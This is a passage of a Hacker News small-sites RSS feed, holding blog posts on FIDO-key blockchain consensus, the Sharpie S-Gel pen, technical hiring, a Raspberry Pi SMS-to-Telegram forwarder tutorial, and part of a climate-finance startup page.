paranoia-disaffiliation effect.</p><hr><p>Thanks for reading! If you think you or your company could benefit from my expertise, I’d be remiss if I didn’t alert you to the fact that I am an <a href="https://consult.sauvik.me/services">independent consultant and accepting new clients</a>. My expertise spans UX, human-centered cybersecurity and privacy, and data science.</p><p>If you read this and thought: “whoah, definitely want to be spammed by that guy”, there are three ways to do it:</p><ul><li><a href="http://eepurl.com/bBpBU1">Subscribe to my mailing list</a> (spam frequency: a couple of times a month.)</li><li><a href="https://twitter.com/scyrusk">Follow me on Twitter</a> (spam frequency: weekly)</li><li><a href="https://www.youtube.com/channel/UCn4ZcBS7p7N4KwVmJwy3bzQ">Subscribe to my YouTube channel</a> (spam frequency: ¯_(ツ)_/¯)</li></ul><p>You also can do none of these things, and we will all be fine.</p><hr></div></div>]]>
            </description>
            <link>https://consult.sauvik.me/posts/paranoia-disaffiliation-hypothesis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26214353</guid>
            <pubDate>Sun, 21 Feb 2021 15:53:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Efficient blockchain architecture based on FIDO keys]]>
            </title>
            <description>
<![CDATA[
Score 51 | Comments 58 (<a href="https://news.ycombinator.com/item?id=26214175">thread link</a>) | @dandanua
<br/>
February 21, 2021 | https://dandanua.github.io/posts/super-efficient-blockchain-architecture-based-on-fido-keys/ | <a href="https://web.archive.org/web/*/https://dandanua.github.io/posts/super-efficient-blockchain-architecture-based-on-fido-keys/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="1-introduction">1. Introduction</h2><p>Reaching decentralized consensus is hard. Really, there must be a reason why Bitcoin network is such an energy-inefficient monster with its Proof-of-Work algorithm. Of course, many other consensus algorithms exist that are not that power-hungry, for example, Proof-of-Stake variations. But they require some sort of centralization, usually hidden under details and complexity. And they still have limits, a boundary on the total number of transactions per second that a network can process.</p><p>I don’t believe it’s possible to find an efficient consensus algorithm, which would be truly decentralized. But why restrict ourselves to just software solutions? Here I want to explain that a super-efficient hardware solution exists. And it’s already within the reach of our current technologies.</p><h2 id="2-the-main-problem">2. The Main Problem</h2><p>What is the root cause of why it’s so hard to achieve a decentralized consensus?</p><p>Well, in the case of cryptocurrencies it’s called <em>double spending</em>. If Clara has 100 coins at some point in time then she can’t spend 200 coins – the network will just ignore such transaction as incorrect. But transferring 100 coins to Alice or 100 coins to Bob are both correct transactions. Yet they are conflicting. If Clara simultaneously commits both these transactions then the network has to decide what to choose as the right one and what to discard.</p><p>Making a decision based on time is not a deterministic way, because some participants can receive one of the conflicting transactions earlier in time, while the others will see a different order.</p><p>Somehow the whole network, i.e. every participant of it, has to decide what to pick as the correct transaction in a way, that will be in agreement with the decisions of every other participant.</p><p>This decision can’t be based on some mathematical function of a transaction (if Clara has enough freedom of composing it). For example, we can’t have a rule where we pick the transaction of 100 coins to Alice as correct because <em>A &lt; B</em>. Because if Clara commits another conflicting transaction of 100 coins to Aaron later in time, then the whole network would have to change its decisions.</p><p>Note that the same problem exists in a broader context, not related to currencies. For example, you can have a blockchain network where users can play chess games. At any moment in time a player has a set of allowable moves. But a player is allowed to choose only one move. If he commits two moves simultaneously, then, again, the network has to decide what to pick as the right one.</p><p>There are many consensus algorithms invented, but they are just ways to centralize a network, where these conflict resolution decisions are made by some selected (or elected) set of participants. In fact, Bitcoin PoW consensus algorithm is a form of election of a participant (miner), whose decision will be set as correct for the whole network.</p><hr><p>So, how can we use hardware to solve this problem?</p><p>Imagine hypothetical hardware that additionally signs Clara’s transactions (via some cryptographic microchips). Moreover, this hardware keeps a counter of Clara’s transactions and <em>attaches</em> this number to a signed transaction. So, the network will see a transaction with its number that has two signatures – the one by Clara’s private key and another one by hardware private key.</p><p>Conflict resolution is trivial in this case. The network will accept a transaction that has a lower counter (it has to be +1 of the previous transaction number).</p><p>The main assumption that we need for network security is that Clara can’t tamper hardware or simulate it in some way. Of course, making tamper-proof hardware is also a hard task, but the technology is almost there. There are a lot of tamper-resistant USB keys that are already on the market.</p><p>Actually, FIDO keys are already satisfying our blockchain needs!</p><h2 id="3-fido-keys">3. FIDO keys</h2><p>FIDO (Fast IDentity Online) is an alliance of the world’s major IT companies. They developed U2F (Universal 2nd Factor) – an open standard of two-factor authentification that uses USB or NFC keys. Luckily, this standard is indeed universal. Even though it was developed as an addition to password authentification in centralized services, we can use it in a blockchain network instead!</p><p>A nice overview of U2F protocol you can see <a href="https://developers.yubico.com/U2F/Protocol_details/Overview.html">here</a>.</p><p>In particular, look at this diagram</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://developers.yubico.com/U2F/Protocol_details/auth_flow4.svg" alt="Mobile View"><em>https://developers.yubico.com/U2F/Protocol_details/Overview.html</em></p><p>It is supposed that a Relying Party (server) starts second-factor authentification by sending a <em>challenge</em> to a client. But blockchain network has no servers. Instead of a challenge, Clara uses the hash of her transaction, where <em>app_id</em> is just a name of the blockchain network and <em>handle</em> is Clara’s personal public key. Then the U2F device will update the counter and return the signed transaction with the attached counter. This is exactly what we need! Clara then sends this information along with the actual transaction and her own signature to the network.</p><p>To ensure that Clara can’t simulate the device, U2F protocol additionally includes the attestation certificate of the device manufacturer, as explained <a href="https://fidoalliance.org/fido-technotes-the-truth-about-attestation/">here</a>.</p><h2 id="4-typical-usage-scenario">4. Typical usage scenario</h2><p>First of all, a user has to register in the network. To do this, he needs to have FIDO hardware key and to generate his personal private/public keys. The registration is essentially linking personal keys with device keys. For this, an empty challenge can be used in the device signing flow.</p><p>Making transactions was described in the previous section.</p><p>If the device is lost/broken/stolen then the user can register another device with its personal key. Though, in this case, the network should wait for some time, for example, 24 hours, to be sure that the previous device (in a couple with the personal key) is not used anymore.</p><h2 id="5-threats">5. Threats</h2><p>Since every transaction must have two signatures – by device and user, the device alone can’t be used to harm its user.</p><p>But an incorrect or tampered device can be used to submit conflicting transactions to the network (for example, with the same counter). This will split the network if no other consensus algorithm is involved.</p><p>But we can assume that manufacturer has no incentives to make incorrect devices to harm the network.</p><p>So, the only threat is device tampering. Even though modern FIDO keys are tamper-resistant, their security is probably not enough to be used in blockchain networks, because there were no reasons to make them fully tamper-proof in usage with centralized servers. But nearly tamper-proof technology is certainly possible.</p><h2 id="6-super-efficiency">6. (Super) Efficiency</h2><p>As for this blockchain efficiency, it’s certainly unreachable for ordinary blockchains. Because in this architecture, no additional communication to resolve possible conflicts is needed <strong><em>AT ALL</em></strong>. Every possible conflict is resolved immediately in an independent and coherent fashion.</p><h2 id="7-final-words">7. Final Words</h2><p>This is, of course, only a high-level overview of blockchain architecture. A lot of details are skipped. But I hope it can be seen that this architecture is a real solution to a lot of blockchain problems.</p><hr><p><em><a href="https://news.ycombinator.com/item?id=26214175">Discussion</a> on HackerNews.</em></p></div></div>]]>
            </description>
            <link>https://dandanua.github.io/posts/super-efficient-blockchain-architecture-based-on-fido-keys/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26214175</guid>
            <pubDate>Sun, 21 Feb 2021 15:36:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On the Sharpie S-Gel’s Popularity]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26214161">thread link</a>) | @gennarro
<br/>
February 21, 2021 | https://unsharpen.com/on-the-sharpie-s-gel-popularity/ | <a href="https://web.archive.org/web/*/https://unsharpen.com/on-the-sharpie-s-gel-popularity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><small>Unsharpen may earn a commission when you buy through links on our site.</small></p><div>

                                
                                <p>The Sharpie S-Gel is a relatively new gel pen that was first released in early 2020. Sharpie, being known for its permanent markers, has produced pens for some time, but those have mostly been fiber-tipped, marker-like pens. These pens, which are essentially just thin Sharpie markers, developed a solid following, they were simply an extension of the Sharpie marker’s popularity.</p>
<p>And then came the <a href="https://unsharpen.com/pen/sharpie-s-gel/">S-Gel</a>.</p>

<h2><span id="S-Gels_Origin">S-Gel’s Origin</span></h2>
<p>The S-Gel is one of a huge number of retractable gel pens, so why was it able to come along and gain such popularity? The pen is sold in normal ink colors (black, blue, red, green, and purple) and a normal set of tip sizes (0.38 mm, 0.5 mm, 0.7 mm, and 1.0 mm / ultra fine, fine, medium, bold). The S-Gel is priced competitively, but isn’t particularly cheap at about 80 cents a pen, depending on the pack you buy.</p>

<h2><span id="S-Gel_Ink">S-Gel Ink</span></h2>
<p>The S-Gel ink offers the smooth writing experience you’d expect from a gel pen, but you’d be hard-pressed to call it extraordinary. Yes, it’s a high performance gel pen, but does it really offer an exceptional writing experience when compared to a <a href="https://unsharpen.com/pen/zebra-sarasa-grand/">Zebra Sarasa</a> or <a href="https://unsharpen.com/pen/pentel-energel-alloy-gel/">Pentel Energel</a> or any of today’s other best gel pens?</p>
<p>Having used the blue and black gel ink colors extensively in both the standard black model, as well as the metal body executive version and the frosted blue barrel, I can say this is a very good gel pen and one I like using, but it’s not anything that we haven’t seen before. The pens are refillable, but refills aren’t currently available online, making this is a moot point for now.</p>
<p>The ink is quick drying, but not as resistant to smear and bleed through as the Energel. The ink is intensely colored, but doesn’t seem remarkable compared to a Uni-ball Signo. The fine tip is smooth, but not particularly smooth relative to a Jetstream.</p>
<h2><span id="Non-Permanent_Ink">Non-Permanent Ink</span></h2>
<p>The pen has the obvious and someone concerning quality of not using permanent ink. Sharpie is a brand build on permanent ink, so not seeing this in their gel pen is odd. Perhaps the permanence would have needed pigmented ink, which would have meant the pen wouldn’t be the smoothest possible gel pen, but it’s still going to be a surprise for many buyers.</p>
<p>The S-Gel has a contoured rubber grip that is similar to the sneaker grip of the Pilot Acroball. It’s comfortable and it holds up well, despite looking like the sort of grip that will break down over time, and get the shiny, oily feel of disintegrating rubber.</p>
<p>Today the S-Gel is a full pen lineup but at launch, in January 2020, it was just two sizes and two colors. At the same time Sharpie launched a rollerball pen — the Roller Pen — that hasn’t seen anywhere near the same success.</p>
<p><a href="https://4bdggq3b9eos1q9hpx466wnu-wpengine.netdna-ssl.com/wp-content/uploads/Sharpie-S-Gel-01-scaled.jpg"><img loading="lazy" src="https://4bdggq3b9eos1q9hpx466wnu-wpengine.netdna-ssl.com/wp-content/uploads/Sharpie-S-Gel-01-1024x458.jpg" alt="" width="561" height="251" srcset="https://4bdggq3b9eos1q9hpx466wnu-wpengine.netdna-ssl.com/wp-content/uploads/Sharpie-S-Gel-01-1024x458.jpg 1024w, https://4bdggq3b9eos1q9hpx466wnu-wpengine.netdna-ssl.com/wp-content/uploads/Sharpie-S-Gel-01-450x201.jpg 450w, https://4bdggq3b9eos1q9hpx466wnu-wpengine.netdna-ssl.com/wp-content/uploads/Sharpie-S-Gel-01-768x343.jpg 768w, https://4bdggq3b9eos1q9hpx466wnu-wpengine.netdna-ssl.com/wp-content/uploads/Sharpie-S-Gel-01-1536x687.jpg 1536w, https://4bdggq3b9eos1q9hpx466wnu-wpengine.netdna-ssl.com/wp-content/uploads/Sharpie-S-Gel-01-2048x915.jpg 2048w" sizes="(max-width: 561px) 100vw, 561px"></a></p>
<h2><span id="So_What_Happened">So What Happened?</span></h2>
<p>So what caused the S-Gel, with its relatively standard black ink and blue ink in 0.5 mm and 0.7 mm sizes to become the most popular Sharpie pen and perhaps the best selling new gel ink pen in years? Online reviews point to appreciate for the pen as a good writer and a useful office pen, but few highlight it as being one of the most exception products of 2020.</p>
<p>The obvious factor we’ve yet to discuss it the strength of the Sharpie brand. Perhaps simply through brand recognition and reach of its distribution network (via its parent company Newell Brands, owners of Waterman, PaperMate, Rotring, and others) the Sharpie S-Gel was able to brute-force its way into strong place in the market for gel ink pens.</p>
<h3><span id="What_About_The_Roller_Pen">What About The Roller Pen?</span></h3>
<p>So why did the same not happen with the Roller Pen? It’s hard to say, but it’s clear from trends of the past 5+ years that the gel pen has been overtaking the rollerball in the US. Customer preference is a strong thing, and the shift to retractable gel pens from capped rollerballs seems to be undeniable. Perhaps larger market forces made the success of the S-Gel likely and the lack of success of the Roller Pen inevitable?</p>
<h3><span id="Playing_The_Game_Well">Playing The Game Well</span></h3>
<p>The Sharpie marketing engine seems to be in full force, with the S-Gel ranking for multiple top spots on Amazon for generic terms like “gel pen” and even winning the top result for “pens.” This is combined with aggressive advertising on Amazon search placements for pen-related terms as well as placement in almost all the big box office stores in the US.</p>
<p>So, yes, the Sharpie S-Gel is a good pen and far be it from us to say it’s not deserving of its success, but seeing one pen explode in popularity while so many other new products remain obscure or see just middling success certainly raised questions with anyone who watches the pen market.</p>
<!-- AI CONTENT END 2 -->

                            </div></div>]]>
            </description>
            <link>https://unsharpen.com/on-the-sharpie-s-gel-popularity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26214161</guid>
            <pubDate>Sun, 21 Feb 2021 15:34:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hiring Software Devs Without Bullshit]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26214020">thread link</a>) | @sidcool
<br/>
February 21, 2021 | https://lanning.bearblog.dev/hiring-without-bullshit/ | <a href="https://web.archive.org/web/*/https://lanning.bearblog.dev/hiring-without-bullshit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div><p>Yes, it's yet another blog about issues with current technical hiring practices and what I'd like to see. First let's define the current Big Corp Hiring pipeline, which many other companies <a href="https://stevemcconnell.com/articles/cargo-cult-software-engineering/">love to copy</a>. Because we all know if we act like Google, we will be Google.</p>
<ol>
<li><p>Some sort of phone screen. I imagine this is to confirm you have a pulse, at least bothered to read what the company does, filter people with unpleasant voices, filter people with thick accents (which feels like racism to me), filter people who are too awkward, and other asinine reasons that essentially come down to "gut feeling". Frankly, I don't care if you're any of those things (well, you probably need a pulse, but I'm not a zombiest). I only care that you're pleasant to work with and competent. The great part about this is it's a "skill" hardened interviewers love to say they've "mastered" and they "just know" after a brief conversation with someone. Shockingly enough, these people never seem to self reflect on their accuracy saying "it's too hard to measure". It would actually be fairly easy to measure based on how many people who pass the phone screen ultimately fail the pipeline, or who are hired yet don't perform well, and/or checking where the candidates they didn't let through end up. Measuring would likely reveal <a href="https://www.nytimes.com/2013/06/20/business/in-head-hunting-big-data-may-not-be-such-a-big-deal.html">fairly poor accuracy</a> and systemic bias, so we'll skip that.</p>
</li>
<li><p>A leet code question. This is to verify the person in question can "actually code". Programmers love to think most other programmers can't actually code and are dumb gorillas. What it's really testing is how well you can code while under extreme pressure, and that's <a href="https://news.ncsu.edu/2020/07/tech-job-interviews-anxiety/">actually very hard to do</a>. It may also be under the guise of "seeing how the candidates think" or "how they explain themselves". Truthfully, I don't care how candidates think, I care about their solution. They should be able to explain their solution, but I could care less if the way they got there is a lesser demon whispering in their ear. Humans are bad at explaining how they discovered a solution to a problem, and when they try to explain, they're likely not explaining how they really solved the problem. What's likely happening is their leet code muscle memory kicked in, and now they have to ad-hoc rationalize some made up explanation. Another thing interviewers love to do is poorly define the problem to make sure you can "gather requirements". If you're not privy to this common haze, of course you're an idiot and a no hire.</p>
</li>
<li><p>Repeat step two a few times. This is to "gather signal". Really, it's to weed out the smart developers who may have had good enough intuition to solve a few leet code questions without grinding them a few hours every night. You don't want developers like that, you want developers who will shut up and do the leet code.</p>
</li>
<li><p>A culture fit round! Yep, like the phone screen we can filter out awkward people or people who are the wrong color or gender. A culture fit round gives us a free pass to do this after they've already proven themselves to be technically competent. I don't know about you, but I cannot tell if someone is a "culture fit" or pleasant to work with after a short lunch. Many studies have already shown humans are notoriously bad at judging someone based on first impressions.</p>
</li>
</ol>
<p>tl;dr Hiring software devs is like choosing math professors based on how good they were at Math Olympiad. Clearly there's some correlation, but you'd be throwing away a lot of good professors.</p>
<p>Where do we go from here? Here are some options.</p>
<ol>
<li><p>Have a public repo and a board of open cases candidates can do. Pay them for their work if you do accept their PR. Give them code review and see how they respond. If you like the work they do, hire them fulltime. This is essentially lightweight contracting. It's representative of their actual skill. The bastardized version of this are 2 to 3 hour long unpaid "take homes" which are then thrown directly into the trash are incredibly disrespectful to the candidates.</p>
</li>
<li><p>Let the candidate put forth their own work. Let them put forth whatever they want. Ask questions and take context into mind. Clearly a small personal project might not have an entire suite of tests and complicated CI/CD pipeline. Have the candidate do some code review on your own project.</p>
</li>
<li><p>Solve a problem together. Yep, solve a problem that you haven't perfectly rehearsed. As a smug interviewer looking to clap down candidates, this is incredibly scary, but representative of how working with a coworker actually is. When you and your coworker collaborate on a real problem, no one knows the answer before hand, you figure it out together. Let them lead, but work together as if this was your real coworker.</p>
</li>
</ol>
<p>It deeply saddens me that the current hiring process is the best we've come up with and we need to do better.</p>
</div>
</div></div>]]>
            </description>
            <link>https://lanning.bearblog.dev/hiring-without-bullshit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26214020</guid>
            <pubDate>Sun, 21 Feb 2021 15:15:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build an SMS Forwarder with Raspberry Pi Zero W and Waveshare SIM7000E Hat]]>
            </title>
            <description>
<![CDATA[
Score 118 | Comments 54 (<a href="https://news.ycombinator.com/item?id=26213956">thread link</a>) | @mtrcn
<br/>
February 21, 2021 | https://mete.dev/2021/02/21/build-an-sms-forwarder-with-raspberry-pi-zero-w-and-waveshare-sim7000e-hat/ | <a href="https://web.archive.org/web/*/https://mete.dev/2021/02/21/build-an-sms-forwarder-with-raspberry-pi-zero-w-and-waveshare-sim7000e-hat/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<p>In this guide, I will explain how to receive SMS messages and forward them to your Telegram account using Raspberry PI Zero W and <a rel="noreferrer noopener" href="https://www.waveshare.com/SIM7000E-NB-IoT-HAT.htm" target="_blank">Wireshare GSM hat</a>. </p>



<div><figure><img loading="lazy" src="https://mete.dev/wp-content/uploads/2021/02/2021-02-21-14_09_49-Clipboard.png" alt="" width="473" height="380" srcset="https://mete.dev/wp-content/uploads/2021/02/2021-02-21-14_09_49-Clipboard.png 945w, https://mete.dev/wp-content/uploads/2021/02/2021-02-21-14_09_49-Clipboard-300x241.png 300w, https://mete.dev/wp-content/uploads/2021/02/2021-02-21-14_09_49-Clipboard-768x618.png 768w" sizes="(max-width: 473px) 100vw, 473px"></figure></div>



<p>Python will be used to read SMS messages and forward them to <a rel="noreferrer noopener" href="https://core.telegram.org/bots/api" target="_blank">Telegram Bot API</a>. Messages will be listened to by <a rel="noreferrer noopener" href="https://wammu.eu/smsd/" target="_blank">Gammu</a> SMS service and it will trigger the Python script when an SMS message received.  </p>



<h2>Setup</h2>



<p>First of all, we have to enable communication between GSM hat and Raspberry PI Zero, run Raspberry Pi Software Configuration Tool (raspi-config);</p>



<pre><code>$ sudo raspi-config</code></pre>



<p>Then, follow following actions;</p>



<div><figure><img loading="lazy" src="https://mete.dev/wp-content/uploads/2021/02/image-1.png" alt="" width="743" height="458" srcset="https://mete.dev/wp-content/uploads/2021/02/image-1.png 990w, https://mete.dev/wp-content/uploads/2021/02/image-1-300x185.png 300w, https://mete.dev/wp-content/uploads/2021/02/image-1-768x474.png 768w" sizes="(max-width: 743px) 100vw, 743px"><figcaption>Go to Interface Options</figcaption></figure></div>



<figure><img loading="lazy" src="https://mete.dev/wp-content/uploads/2021/02/image-2.png" alt="" width="745" height="457" srcset="https://mete.dev/wp-content/uploads/2021/02/image-2.png 993w, https://mete.dev/wp-content/uploads/2021/02/image-2-300x184.png 300w, https://mete.dev/wp-content/uploads/2021/02/image-2-768x471.png 768w" sizes="(max-width: 745px) 100vw, 745px"><figcaption>Select and enter P6 Serial Port</figcaption></figure>



<div><figure><img loading="lazy" src="https://mete.dev/wp-content/uploads/2021/02/image-3.png" alt="" width="740" height="458" srcset="https://mete.dev/wp-content/uploads/2021/02/image-3.png 987w, https://mete.dev/wp-content/uploads/2021/02/image-3-300x185.png 300w, https://mete.dev/wp-content/uploads/2021/02/image-3-768x475.png 768w" sizes="(max-width: 740px) 100vw, 740px"><figcaption>Select No at this screen.</figcaption></figure></div>



<div><figure><img loading="lazy" src="https://mete.dev/wp-content/uploads/2021/02/image-4.png" alt="" width="740" height="459" srcset="https://mete.dev/wp-content/uploads/2021/02/image-4.png 986w, https://mete.dev/wp-content/uploads/2021/02/image-4-300x186.png 300w, https://mete.dev/wp-content/uploads/2021/02/image-4-768x477.png 768w" sizes="(max-width: 740px) 100vw, 740px"><figcaption>Lastly, select Yes at this screen.</figcaption></figure></div>



<p>Exit configuration tool. Now we need to enable UART on raspberry pi. Shutdown and eject SD card to open in another computer. Open /boot/config.txt file, find the below statement and uncomment it to enable the UART. You can directly append it at the end of the file as well.</p>



<pre><code>enable_uart=1</code></pre>



<p>Now, reboot raspberry pi device and open the console to install Gammu SMS Deamon and Python PiP package installer. </p>



<pre><code>$ sudo apt-get update
$ sudo apt-get install python-pip gammu-smsd</code></pre>



<p>Install Telegram Bot API python library.</p>



<pre><code>$ sudo pip install python-telegram-bot==12.3.0</code></pre>



<p><em>Note: Version 12.3.0 is the latest version that is compatible with Python 2.7, if you want to use it with Python 3+ version, you can install the latest available version.</em></p>



<p>Now you need to create a bot in Telegram and obtain a token. Afterwards, start a chat with that bot in your Telegram account and send a test message to your bot. This will help us to identify your chat ID. </p>



<p>Open following URL with you Telegram Bot token and copy the chat ID in the response; </p>



<pre><code>https://api.telegram.org/bot[YOUR-BOT-TOKEN]/getUpdates</code></pre>



<div><figure><img loading="lazy" width="269" height="29" src="https://mete.dev/wp-content/uploads/2021/02/image.png" alt=""><figcaption>This is your chat ID.</figcaption></figure></div>



<p>Save following script in /home/pi/forward-telegram.py;</p>



<pre><code>#!/usr/bin/env python
from __future__ import print_function
import os
import sys
import telegram

numparts = int(os.environ['DECODED_PARTS'])

text = ''
# Are there any decoded parts?
if numparts == 0:
    text = os.environ['SMS_1_TEXT']
# Get all text parts
else:
    for i in range(1, numparts + 1):
        varname = 'DECODED_%d_TEXT' % i
        if varname in os.environ:
            text = text + os.environ[varname]

# Log
print('Number %s have sent text: %s' % (os.environ['SMS_1_NUMBER'], text))

#Send by Telegram
bot = telegram.Bot(token='[YOUR-BOT-TOKEN]')
bot.send_message(chat_id=[YOUR CHAT ID], text=os.environ['SMS_1_NUMBER'].strip() + " | "+ text)
</code></pre>



<p>Make python file executable</p>



<pre><code>$ chmod +x /home/pi/forward-telegram.py</code></pre>



<p>Update Gammu SMS Deamon’s configuration to use GSM hat. Waveshare uses /dev/ttyS0 for communication. </p>



<pre><code>$ sudo nano /etc/gammu-smsdrc</code></pre>



<p>Find following lines in the configuration file and update with correct values, for me these values are following;</p>



<pre><code>port = /dev/ttyS0
connection = at115200</code></pre>



<p>Also, we need to specify the script path to be ran by Gammu so add following line below [smsd] section;</p>



<pre><code>RunOnReceive = /home/pi/forward-telegram.py</code></pre>



<p>You can find my complete configuration file <a rel="noreferrer noopener" href="https://gist.github.com/mtrcn/045d7eeef1e38c092939d5ee87f96fb0" target="_blank">here</a>.</p>



<p>Restart Gammu SMS service.</p>



<pre><code>$ sudo systemctl restart gammu-smsd.service</code></pre>



<p>That’s all! You should now able to get your SMS messages to your Telegram account. </p>



<p>You can monitor Gammu SMS service for any problem with the following command;</p>



<pre><code>$ sudo systemctl status gammu-smsd.service</code></pre>




						
											</div></div>]]>
            </description>
            <link>https://mete.dev/2021/02/21/build-an-sms-forwarder-with-raspberry-pi-zero-w-and-waveshare-sim7000e-hat/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26213956</guid>
            <pubDate>Sun, 21 Feb 2021 15:07:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Capturing the °Climate Factor]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26213827">thread link</a>) | @doener
<br/>
February 21, 2021 | https://www.right-basedonscience.de/en | <a href="https://web.archive.org/web/*/https://www.right-basedonscience.de/en">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-collapse="medium" data-animation="default" data-duration="400" role="banner"><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ddbd8f4d31f0f70026f1311_rbos-Logo%402x.png" width="160" alt=""></p></div><p><h4>Get a clear view of your contribution to global warming. Science-based, transparent and tangible: in °C</h4></p></div><div><div data-collapse="medium" data-animation="default" data-duration="400" role="banner"><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ddbd8f4d31f0f70026f1311_rbos-Logo%402x.png" width="160" alt=""></p></div><div><h4>Whitepaper</h4><h4>Linking Financial Performance and <br>Climate Action with the XDC&nbsp;Model<br>‍<br></h4></div></div><div id="XDC"><h2>X-Degree Compatibility (XDC)</h2><p>The software of the Frankfurt-based climate change startup, right. based on science, allows you to calculate the contributions of a company or portfolio to climate change (Temperature Alignment). Results are expressed in a tangible °C number.</p><div><p>The engine of the software is the X-Degree Compatibility (XDC) Model, an economic climate impact model, which connects economic realities with climate science. You can make your own assumptions about the development of key drivers in different scenarios, for example, following the guidelines of the TCFD. The direct integration of a climate model into the XDC Model allows for dynamic, future-oriented calculations of the influence of a company or portfolio on climate change.<br>‍<br>The results of scenario analyses can be used for setting and managing climate targets, risk management, reporting (from an inside-out perspective of double materiality), and communication.</p></div></div><section id="cards-section"><div><h2>Events</h2><div><div id="w-node-b743ba44-b251-01db-a5c3-b23140829710-8263727c"><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f8ae0701829f4e8fb3309e9_Tech.PNG" sizes="100vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f8ae0701829f4e8fb3309e9_Tech-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f8ae0701829f4e8fb3309e9_Tech.PNG 780w" alt=""></p><h3><strong>Tech Conference</strong></h3><p><strong>November 6, 2020</strong>, Can Tech Save The World? Hannah Helmke &amp; Dr. Jacopo Pellegrino<br>‍</p><p><a href="https://conference.tech-academy.io/" target="_blank">Registration</a></p></div><div id="w-node-b743ba44-b251-01db-a5c3-b2314082971e-8263727c"><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f99a89ba1b2cd9868ab815e_Cover_Quadrat.png" sizes="100vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f99a89ba1b2cd9868ab815e_Cover_Quadrat-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f99a89ba1b2cd9868ab815e_Cover_Quadrat-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f99a89ba1b2cd9868ab815e_Cover_Quadrat.png 1036w" alt=""></p><h3 id="w-node-b743ba44-b251-01db-a5c3-b23140829721-8263727c"><strong>Capturing the °Climate Factor</strong></h3><p id="w-node-b743ba44-b251-01db-a5c3-b23140829724-8263727c"><strong>November 10, 2020</strong>, 1:30pm, Webinar with Dr. Sebastian Müller and Dominique Dare, CFA, CIPM<br>‍</p><p><a href="https://www.crowdcast.io/e/capturing-the-climate/register" target="_blank">Registration</a></p></div><div id="w-node-b743ba44-b251-01db-a5c3-b2314082972c-8263727c"><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f92b9de59ed94c2c4c92764_2020_right._XDC_Fair_Finance.PNG" sizes="100vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f92b9de59ed94c2c4c92764_2020_right._XDC_Fair_Finance-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f92b9de59ed94c2c4c92764_2020_right._XDC_Fair_Finance.PNG 783w" alt=""></p><h3 id="w-node-b743ba44-b251-01db-a5c3-b2314082972f-8263727c"><strong>Fair Finance Week</strong></h3><p id="w-node-b743ba44-b251-01db-a5c3-b23140829732-8263727c"><strong>11. November 2020</strong>, 19:30 Uhr, Klimakrise = Finanzkrise | Finanzkrise = Klimakrise! Hannah Helmke<br>‍</p><p><a href="https://veranstaltungen.gls.de/index.php?page=event-code&amp;code=FFW2020DACH" target="_blank">Anmeldung</a></p></div><div id="w-node-b743ba44-b251-01db-a5c3-b2314082973a-8263727c"><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f92bd49716e4330705c3714_2020_right._XDC_Bundesbank.PNG" alt=""></p><h3 id="w-node-b743ba44-b251-01db-a5c3-b2314082973d-8263727c"><strong>Deutsche Bundesbank</strong></h3><p id="w-node-b743ba44-b251-01db-a5c3-b23140829740-8263727c"><strong>November 20, 2020</strong>: New expert panel: “Sustainable and Green Finance” Hannah Helmke<br>‍</p><p><a href="https://www.bundesbank.de/en/bundesbank/international-central-bank-dialogue/newsletter/ausgaben/new-expert-panel-sustainable-and-green-finance--781064" target="_blank">Registration</a></p></div></div></div></section><section id="feature-section"><h5>Out now</h5><div><h2>XDC&nbsp;Portfolio Explorer</h2><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f9abe7236f0d92fdef112da_Anzeige.png" loading="lazy" width="549" sizes="(max-width: 479px) 100vw, 549px" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f9abe7236f0d92fdef112da_Anzeige-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f9abe7236f0d92fdef112da_Anzeige-p-800.png 800w, 